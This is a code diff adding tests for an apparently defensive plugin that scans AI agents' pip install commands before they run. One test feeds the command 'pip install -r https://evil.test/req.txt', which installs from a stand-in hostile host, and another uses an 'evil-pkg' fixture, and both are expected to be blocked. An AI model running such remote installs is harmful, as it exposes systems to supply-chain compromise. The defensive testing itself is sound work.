@@ -16,6 +16,7 @@ from agentshield.core.models import (
     Decision,
     DecisionAction,
     Ecosystem,
+    FileScanResult,
     Finding,
     ScanRequest,
     ScanResult,
@@ -465,6 +466,56 @@ async def test_bash_tool_pip_install_needs_confirmation(tmp_path):
     assert isinstance(result, ToolResult)
     assert result.requires_confirmation
     assert result.on_confirm is call
+
+
+@pytest.mark.asyncio
+async def test_shell_requirements_file_is_scanned(tmp_path):
+    """`pip install -r requirements.txt` must scan the referenced manifest."""
+    plugin = _make_plugin(tmp_path)
+    req_file = tmp_path / "requirements.txt"
+    req_file.write_text("evil-pkg==1.0.0\n")
+    call = ToolCall(name="bash", args={"command": f"pip install -r {req_file}"})
+
+    file_result = FileScanResult(
+        path=str(req_file),
+        results=[],
+        aggregate_decision=Decision(action=DecisionAction.BLOCK, reason="1 package(s) blocked"),
+        total_packages=1,
+        blocked=1,
+    )
+    with patch.object(
+        plugin.shield, "ascan_file", new=AsyncMock(return_value=file_result)
+    ) as mock_scan_file:
+        result = await plugin.before_tool_call(call)
+
+    mock_scan_file.assert_called_once()
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+    assert str(req_file) in (result.error_message or "")
+
+
+@pytest.mark.asyncio
+async def test_shell_missing_requirements_file_passes_through(tmp_path):
+    """A referenced manifest that does not exist is skipped (install would fail anyway)."""
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(name="bash", args={"command": "pip install -r /nonexistent/req.txt"})
+
+    with patch.object(plugin.shield, "ascan_file", new=AsyncMock()) as mock_scan_file:
+        result = await plugin.before_tool_call(call)
+
+    mock_scan_file.assert_not_called()
+    assert result is call
+
+
+@pytest.mark.asyncio
+async def test_shell_remote_requirements_file_blocked(tmp_path):
+    """A remote -r URL cannot be verified and is blocked as a suspicion."""
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(name="bash", args={"command": "pip install -r https://evil.test/req.txt"})
+    result = await plugin.before_tool_call(call)
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+    assert "remote requirements file" in (result.error_message or "")
 
 
 @pytest.mark.asyncio
